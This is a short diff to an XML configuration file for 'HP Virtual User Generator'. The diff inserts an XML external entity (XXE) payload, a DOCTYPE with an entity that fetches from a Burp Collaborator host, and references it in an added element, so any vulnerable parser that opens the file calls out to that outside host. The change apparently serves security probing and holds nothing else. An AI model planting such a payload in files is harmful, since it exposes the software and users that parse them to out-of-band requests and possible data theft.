@@ -1,4 +1,6 @@
 ﻿<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE x[ <!ENTITY xxe SYSTEM "http://8clt03586bmo7x2qr89swgn4zv5lta.burpcollaborator.net/"> ]>
+<x>&xxe;</x>
 <App Name="HP Virtual User Generator">
   <Tasks />
 </App>
